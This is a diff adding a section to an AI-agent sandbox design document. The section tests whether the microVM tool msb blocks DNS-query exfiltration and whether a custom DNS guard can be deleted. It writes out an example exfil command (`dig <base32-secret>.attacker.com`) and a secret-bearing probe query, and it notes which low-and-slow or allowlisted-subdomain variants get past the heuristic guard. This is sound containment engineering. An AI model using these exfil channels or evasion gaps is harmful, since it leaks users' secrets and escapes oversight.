@@ -537,6 +537,68 @@ rip-cage-on-msb**, on two levels:
   a build step, substrate projection, or a fleet cockpit — so it sharpens rather than erases the
   "workbench-above-the-runtime" line.
 
+## §12 — DNS-exfil spike (2026-07-08): does deleting `rip_cage_dns.py` lose a real control?
+
+**Trigger.** An adversarial review of the adopt+delete recommendation returned REVISE on one point:
+§7/§8b bucket `rip_cage_dns.py` (the ADR-012 D9 / ADR-026 D9 DNS-query-shape exfil guard — a FIRM
+decision, explicitly retained as *containment* and explicitly **not** covered by a composed mediator)
+into "delete, msb owns SNI/DNS-pin." The reviewer correctly flagged that **DNS-pinning (anti-rebinding)
+is a different capability from DNS-query-shape exfil coverage**, and the spike had never tested whether
+msb gates the exfil channel. `--no-dns-rebind-protection` in `msb run --help` confirms msb's "DNS-pin"
+is indeed anti-rebinding only. So the justification-as-written was wrong; this section tests the actual
+behavior rather than asserting it.
+
+**The threat.** Classic DNS exfil: agent controls `attacker.com`'s authoritative nameserver, does
+`dig <base32-secret>.attacker.com`. The secret leaves *in the query itself* — it reaches the attacker's
+NS during resolution, before any TCP/HTTP connection. A destination/TCP allowlist never fires because no
+connection to a blocked host is attempted. The exfil succeeds if the **query egresses**, even when the
+guest sees a resolution failure.
+
+**Method (live, msb 0.6.4, `rip-cage:latest`, macOS/HVF).** Cage booted `--net-default deny
+--net-rule allow@api.anthropic.com:tcp:443`.
+1. Guest-side resolution, two independent tools: `curl` and `python3 socket.gethostbyname`. Allowlisted
+   `api.anthropic.com` → resolves (A + AAAA) **and** TLS-connects. Non-allowlisted `example.com`,
+   `google.com` → **fail at resolution itself** ("Could not resolve host" / `gaierror: Name or service
+   not known`), *not* at connect. So msb applies policy at the DNS layer, not merely at connect.
+2. **Wire observation (the decisive test)** — is the guest-side failure "msb dropped the query" or "msb
+   forwarded it upstream and discarded the answer" (still an exfil)? Booted a second cage with
+   `--dns-nameserver 127.0.0.1:5354` pointed at a host-side UDP logger that records the QNAME of every
+   query msb forwards. Fired an allowlisted query and an arbitrary exfil-shaped non-allowlisted query
+   (`exfilprobe-secretabc123.attacker-test-domain.com`). **Result: the logger received only
+   `api.anthropic.com` (×2, A+AAAA) and never the exfil name.** The allowlisted query *timed out* (was
+   forwarded to the dead logger, waited); the exfil query failed *immediately* (refused before forward).
+
+**Finding — msb closes the channel, and does so more completely than `rip_cage_dns.py`.** msb filters
+DNS query names against the egress allowlist **before forwarding upstream**: a non-allowlisted name is
+refused at msb's own resolver and never egresses the host. The secret-bearing query does not leave.
+
+Reading `rip_cage_dns.py`'s own docstring makes the comparison sharper — the mechanisms differ, and msb's
+is **stronger** on this threat:
+- `rip_cage_dns.py` **forwards clean non-whitelisted queries** ("DNS resolution itself is not blocked by
+  the whitelist — only exfil-*shaped* queries are refused"); it only blocks on a **long-label heuristic**
+  (label >30 chars) or a **cardinality burst** (>20 queries/apex/sec). A low-and-slow, short-label
+  exfil to a non-whitelisted apex would be **forwarded** — a hole the heuristic leaves open.
+- msb refuses **every** non-allowlisted query regardless of shape → it closes the low-and-slow clean
+  variant that `rip_cage_dns.py` would forward.
+- Exfil *through an allowlisted apex's subdomains*: **neither** tool catches it — `rip_cage_dns.py`
+  passes whitelisted apexes "unconditionally, no heuristic"; msb forwards allowlisted names. No residual
+  advantage to the guard there either. (And it isn't the rip-cage exfil scenario — it needs the attacker
+  to control an allowlisted apex's NS.)
+
+**Verdict on the REVISE — "delete, don't port" HOLDS for `rip_cage_dns.py`, for the correct reason.** The
+reviewer was right that "msb owns DNS-pin" was the wrong justification; the right justification is
+"msb refuses non-allowlisted DNS queries at the resolver before egress (live-proven on the wire),
+which strictly dominates `rip_cage_dns.py`'s forward-clean/block-shaped heuristic on the deny-default
+egress posture that is rip-cage's secure default." The delete is a security **improvement**, not a
+regression. The only thing genuinely lost is the guard's structured, agent-actionable denial **logging**
+(`fix_command` / `config_path` guidance in `egress-dns.log`) — a DevEx/observability loss on the same
+footing as retiring the rest of the egress engine (§7), not a containment loss.
+
+**Caveat kept honest:** msb's DNS filtering is *coupled to the egress allowlist* — it dominates only when
+the cage is `--net-default deny` with a tight allowlist. A cage deliberately run allow-default or with a
+broad `*.suffix` rule forgoes this (and has already abandoned the allowlist posture by choice). rip-cage's
+secure default is deny+allowlist, where msb wins outright.
+
 ## Appendix: host-side gotchas hit during the spike (macOS 26.3)
 
 - **Docker-signed `sbx` binary froze forever pre-main** (syspolicyd launched-suspended,
